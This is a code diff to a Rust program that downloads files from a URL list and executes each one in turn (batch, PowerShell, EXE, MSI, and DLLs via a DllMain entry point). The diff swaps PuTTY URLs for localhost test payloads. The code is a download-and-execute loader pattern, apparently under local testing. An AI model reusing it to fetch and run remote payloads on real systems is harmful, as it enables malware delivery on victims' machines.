@@ -109,26 +109,19 @@ fn temp_filename(url: &str) -> std::io::Result<PathBuf> {
 
 fn main() {
     let urls = vec![
-        (
-            "https://the.earth.li/~sgtatham/putty/0.79/w64/putty.exe",
-            None,
-        ),
-        (
-            "https://the.earth.li/~sgtatham/putty/0.79/w32/putty.exe",
-            None,
-        ),
         ("http://127.0.0.1/bat.bat", None),
-        ("http://127.0.0.1/ps1.ps1", None),
-        // DLL with entry point
         ("http://127.0.0.1/mydll.dll", Some("DllMain")),
-        ("http://127.0.0.1/mydll2.dll", Some("DllMain")),
+        ("http://127.0.0.1/exe.exe", None),
+        ("http://127.0.0.1/ps1.ps1", None),
+        ("http://127.0.0.1/msi.msi", None),
     ];
 
     let (tx, rx) = channel();
+    let urls_len = urls.len(); 
 
-    for (url, entry_point) in urls.clone().into_iter() {
+    for (url, entry_point) in urls.into_iter() {
         let tx = tx.clone();
-        let filename = match temp_filename(&url) {
+        let filename = match temp_filename(url) {
             Ok(fname) => fname,
             Err(e) => {
                 eprintln!("Failed to get temp filename: {:?}", e);
@@ -136,7 +129,7 @@ fn main() {
             }
         };
 
-        let entry_point = entry_point.map(ToString::to_string);
+        let entry_point = entry_point.map(|ep: &str| ep.to_string());
 
         thread::spawn(move || {
             let filename_str = match filename.to_str() {
@@ -147,20 +140,24 @@ fn main() {
                 }
             };
 
-            if let Err(e) = download(&url, filename_str) {
+            if let Err(e) = download(url, filename_str) {
                 eprintln!("Failed to download file: {:?}", e);
                 return;
             }
 
-            tx.send((filename, entry_point))
-                .expect("Failed to send over channel");
+            tx.send((filename, entry_point)).expect("Failed to send over channel");
         });
     }
 
-    for _ in 0..urls.len() {
+    for _ in 0..urls_len {
         if let Ok((filename, entry_point)) = rx.recv() {
             let filename_str = filename.to_str().expect("Filename is not valid Unicode");
-            execute(filename_str, entry_point.as_deref());
+
+            if let Some(ep) = entry_point {
+                execute(filename_str, Some(&ep));
+            } else {
+                execute(filename_str, None);
+            }
         } else {
             eprintln!("Failed to receive from channel");
         }
